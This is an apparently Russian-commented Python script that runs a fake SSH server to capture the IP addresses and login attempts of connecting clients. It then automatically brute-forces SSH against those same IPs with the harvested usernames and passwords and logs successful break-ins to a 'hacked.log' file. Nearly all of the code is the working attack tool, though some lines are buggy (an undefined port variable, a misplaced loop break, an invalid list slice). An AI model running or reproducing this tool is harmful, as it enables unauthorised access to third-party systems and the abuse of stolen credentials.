#!/usr/bin/env python3

from threading import Thread
import os, paramiko
import sys
import time
# import libtmux
import datetime, time
import socket, sys, threading
import queue


logs = "/var/log/bhunter/"
honeypotLog = logs + "honeypot.log"
attackLog = logs + "attack.log"
hacked = logs + "hacked.log"
configs = "/etc/bhunter/"
serverKey = configs + "server.key"

listOfLogins = [] # login = (rate, ("login", "password"))
queOfTargets = queue.Queue() #.put() .get()
setOfCaptureTargets = {} # (target, captureTime)

def addToFile(file, str):
    f = open(file, "a")
    f.write(str)
    f.close()

def logger(file, str):
    timestamp = datetime.datetime.now().strftime("%d-%m-%Y %H:%M")
    addToFile(file, "{} : {}\n".format(timestamp, str))


#------------- HoneyPot Section -------------
def addTarget(target):
    queOfTargets.put(target)
    setOfCaptureTargets[target] = int(time.time())
    logger(honeypotLog, "new target   {}".format(target))

def addLoginPair(login, password, rate):
    listOfLogins.append([rate, (login, password)])
    logger(honeypotLog, "new loginPair ({}, {})".format(login, password))

def SSHLoginsCollector(source, client_socket):
    HOST_KEY = paramiko.RSAKey(filename=serverKey)
    class SSHServerHandler (paramiko.ServerInterface):
        def __init__(self):
            self.event = threading.Event()
        def check_auth_password(self, username, password):
            logger(honeypotLog, "new login ({}, {}, {})".format(source[0], username, password))
            flag = 1
            for i in listOfLogins:
                    if(i[1][0] == username and i[1][1] == password):
                        flag = 0
                    break
            if(flag):
                addLoginPair(username, password, 0)
            return paramiko.AUTH_FAILED
        def get_allowed_auths(self, username):
            return 'password'

    transport = paramiko.Transport(client_socket)
    transport.add_server_key(HOST_KEY)
    server_handler = SSHServerHandler()
    transport.start_server(server=server_handler)
    channel = transport.accept(1)
    if not channel is None:
        channel.close()

def SSHhoneypot():
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind(('', 22))
            server_socket.listen(100)
            # paramiko.util.log_to_file ('paramiko.log')
            while(True):
                try:
                    client_socket, client_addr = server_socket.accept()
                    threading.Thread(target=SSHLoginsCollector, args=(client_addr, client_socket,)).start()
                    logger(honeypotLog, "new connection   {}".format(client_addr[0]))
                    if(not client_addr[0] in setOfCaptureTargets.keys()):
                        addTarget(client_addr[0])
                    # thread.start_new_thread(handleConnection,(client_socket,))
                except Exception as e:
                    print("ERROR: Client handling")
                    print(e)
        except Exception as e:
            print("ERROR: Failed to create socket")
            print(e)
            sys.exit(1)


#------------- SSHAttack Section -------------

#   SSHCheck() проверяет, подходит ли логин:пароль к данному хосту
#   Возвращаемые значения:
#       0 - успешная аутентификация
#       1 - неуспешная аутентификация
#       2 - ошибка соккета при подключении
#       3 - какая либо другая ошибка при подключении по SSH
def SSHCheck(target, SSHport, user, password):
    print("SSHCheck: " + target + " " + user + " " + password)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    resultCode = 0
    print("SSHCheck: trying...")
    try:
        ssh.connect(target, port = sshport, username = user, password = password, timeout=5, banner_timeout = 5, auth_timeout=5)
    except paramiko.AuthenticationException:
        resultCode = 1
    except socket.error:
        resultCode = 2
    except paramiko.ssh_exception.SSHException:
        resultCode = 3
    finally:
        ssh.close()
    print("SSHCheck: end")
    return resultCode

def SSHAttacker():
    while True:
        # if(queOfTargets.empty)
        target = queOfTargets.get()
        logger(attackLog, "starting attack   {}".format(target))
        for i in listOfLogins:
            logger(attackLog, "try   {} {} {}".format(target, i[1][0], i[1][1]))
            status = SSHCheck(target, 22, i[1][0], i[1][1])
            if(status == 0):
                logger(attackLog, "PASSWORD FOUND   {} {} {}".format(target, i[1][0], i[1][1]))
                logger(hacked, "{} {} {}".format(target, i[1][0], i[1][1]))
                i[0] += 1
                listOfLogins.sort()
                listOfLogins.reverse()
            if(status >= 2):
                logger(attackLog, "connection error   {}".format(target))
                break
        logger(attackLog, "complete attack  {}".format(target))


#------------- Main Section -------------
def cleaner():
    global listOfLogins
    listOfLogins.sort()
    listOfLogins.reverse()
    if(len(listOfLogins) > 1000):
        listOfLogins = listOfLogins[0, 100]

def ui():
    def addMenu():
        addTarget(input("new target: "))
    while True:
        print("1) Add target\n2) Add loginpair\n")
        str = input()
        if(str == "1"):
            addTarget(input("new target: "))
        if(str == "2"):
            addLoginPair(input("new login: "), input("password: "), 0)
        if(str == "3"):
            filePath = input("filePath:")
            for i in setOfCaptureTargets.keys():
                addToFile(filePath, i + "\n")
        if(str == "4"):
            filePath = input("filePath:")
            for i in listOfLogins:
                addToFile(filePath, i[1][0] + " " + i[1][1] + "\n")

def main():
    logger(honeypotLog, "STARTING...")
    logger(attackLog, "STARTINDG...")
    Thread(target=SSHhoneypot, args=()).start()
    Thread(target=ui, args=()).start()
    SSHAttacker()
main()
